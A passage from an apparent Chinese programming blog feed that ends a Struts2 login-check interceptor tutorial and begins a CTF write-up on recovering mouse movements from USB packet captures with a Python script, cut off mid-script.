class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-meta">@SuppressWarnings(&quot;serial&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">del</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book del&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PrivilegeInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.interceptor;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionInvocation;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrivilegeInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInterceptor</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext actionContext = invocation.getInvocationContext();<span class="hljs-comment">// 得到ActionContext.</span><br>Object user = actionContext.getSession().get(<span class="hljs-string">&quot;user&quot;</span>);<span class="hljs-comment">//获取user对象</span><br><span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> invocation.invoke(); <span class="hljs-comment">// 继续向下执行</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;您还未登录，请先登录&quot;</span>);<br><span class="hljs-keyword">return</span> Action.LOGIN; <span class="hljs-comment">//如果用户不存在，返回login值</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>$&#123;requestScope.msg&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>用户名:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>密码:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>main.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_del&quot;</span>&gt;</span>book del<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>用户$&#123;user.username&#125;操作成功<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明拦截器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span> </span><br><span class="hljs-tag">             <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.interceptor.PrivilegeInterceptor&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 用户登录操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 关于book操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;book_*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问main.jsp<br><img src="https://img-blog.csdnimg.cn/20210416221426697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接，由于没有登陆，所以没有权限，页面跳转到登录页面要求用户登录。<br><img src="https://img-blog.csdnimg.cn/20210416221438400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登陆成功后点击链接，跳转成功页面，提示用户操作成功。<br><img src="https://img-blog.csdnimg.cn/20210416222502828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>对比可知拦截器成功执行</p><p>以上案例中，创建了一个方法过滤器PrivilegeInterceptor，在struts.xml中配置了该拦截器，如果用户没有登陆，将无法对页面链接进行相应操作，只有登陆后的用户才有权限操作页面相应功能。</p><h2 id="拦截器工作原理"><a href="#拦截器工作原理" class="headerlink" title="拦截器工作原理"></a>拦截器工作原理</h2><p><strong>拦截器的执行顺序</strong><br>invocation.invoke()方法是拦截器框架的实现核心，通过确定invocation.invoke()方法执行位置，来实现Action执行前后处理操作，在invocation.invoke()方法之前的代码将依据配置中拦截器顺序依次执行，直到走完拦截器后再执行invocation.invoke()方法调用Action，然后再依据配置中拦截器顺序反向执行invocation.invoke()方法后的代码，直到走完拦截器</p><p><strong>拦截器的工作原理</strong><br>如图所示<br><img src="https://img-blog.csdnimg.cn/2021042220560043.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>每一个Action请求都包装在一系列的拦截器的内部。拦截器可以在Action执行直线做相似的操作也可以在Action执行直后做回收操作。</p><p>每一个Action既可以将操作转交给下面的拦截器，Action也可以直接退出操作返回客户既定的画面。</p><p><a href="https://www.cnblogs.com/yw-ah/p/5761235.html">https://www.cnblogs.com/yw-ah/p/5761235.html</a><br><a href="https://www.cnblogs.com/wkrbky/p/5894315.html">https://www.cnblogs.com/wkrbky/p/5894315.html</a><br><a href="https://blog.csdn.net/weixin_42529699/article/details/81354355">https://blog.csdn.net/weixin_42529699/article/details/81354355</a><br><a href="https://www.imooc.com/learn/450">https://www.imooc.com/learn/450</a></p>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>USB流量分析</title>
    <link href="/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>摘要：USB流量分析</p> <a id="more"></a><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">当取0×00时,代表没有按键<br>当取0×01时,代表按左键<br>当取0×02时,代表当前按键为右键<br></code></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标右移像素位；<br>值为负时，代表鼠标左移像素位。<br></code></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标上移像素位；<br>值为负时，代表鼠标下移像素位。<br></code></pre></td></tr></table></figure><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><p><strong>题目</strong><br>方法1：<br>基于python2的UsbMiceHacker.py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>mousePositionX = <span class="hljs-number">0</span><br>mousePositionY = <span class="hljs-number">0</span><br><br>X = []<br>Y = []<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br>data = []<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">global</span> mousePositionX<br>    <span class="hljs-keyword">global</span> mousePositionY<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Tips : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        To use this python script , you must install the numpy,matplotlib first.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        You can use `sudo pip install matplotlib numpy` to install it&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Author : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        Thank you for using.&quot;</span><br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    action = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">if</span> action != <span class="hljs-string">&quot;LEFT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;ALL&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;RIGHT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;MOVE&quot;</span>:<br>        action = <span class="hljs-string">&quot;LEFT&quot;</span><br><br>    <span class="hljs-comment"># get data of pcap</span><br>    command = <span class="hljs-string">&quot;tshark -r &#x27;%s&#x27; -T fields -e usb.capdata &gt; %s&quot;</span> % (<br>        pcapFilePath, DataFileName)<br>    <span class="hljs-built_in">print</span> command<br>    os.system(command)<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            data.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># handle move</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        Bytes = i.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">8</span>:<br>            horizontal = <span class="hljs-number">2</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">4</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">4</span>:<br>            horizontal = <span class="hljs-number">1</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">2</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        offsetX = <span class="hljs-built_in">int</span>(Bytes[horizontal], <span class="hljs-number">16</span>)<br>        offsetY = <span class="hljs-built_in">int</span>(Bytes[vertical], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> offsetX &gt; <span class="hljs-number">127</span>:<br>            offsetX -= <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> offsetY &gt; <span 